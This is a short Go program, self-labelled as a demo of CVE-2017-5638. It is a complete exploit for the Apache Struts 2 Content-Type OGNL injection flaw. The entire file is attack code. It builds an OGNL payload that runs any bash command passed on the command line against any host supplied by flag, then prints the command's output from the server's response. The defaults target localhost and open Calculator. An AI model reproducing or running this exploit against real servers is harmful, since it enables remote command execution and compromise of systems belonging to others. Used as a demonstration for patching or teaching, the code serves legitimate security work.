package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

const payload = "%%{(#_='multipart/form-data')." +
	"(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
	"(#p=new java.lang.ProcessBuilder({'/bin/bash','-c', '%s'}))." +
	"(#p.redirectErrorStream(true))." +
	"(#process=#p.start())." +
	"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." +
	"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." +
	"(#ros.flush())}"

func main() {
	host, cmd := arguments()

	req, _ := http.NewRequest("GET", host, nil)
	loaded := fmt.Sprintf(payload, cmd)
	req.Header.Add("Content-Type", loaded)

	response, err := client().Do(req)
	if err != nil {
		fmt.Println(err)
	}

	body, _ := ioutil.ReadAll(response.Body)
	fmt.Println("--------- Response ---------")
	fmt.Println(string(body))
}

func arguments() (host string, cmd string) {
	var argHost = flag.String("h", "http://localhost:8080", "The host to analyze")
	var argCmd = flag.String("c", "open /Applications/Calculator.app", "The command to execute")
	flag.Parse()

	fmt.Println("CVE-2017-5638 Demo")
	if flag.NFlag() == 0 {
		flag.PrintDefaults()
	}
	return *argHost, *argCmd
}

func client() (client *http.Client) {
	var coreClient = &http.Client{
		Timeout: time.Second * 300,
	}
	return coreClient
}
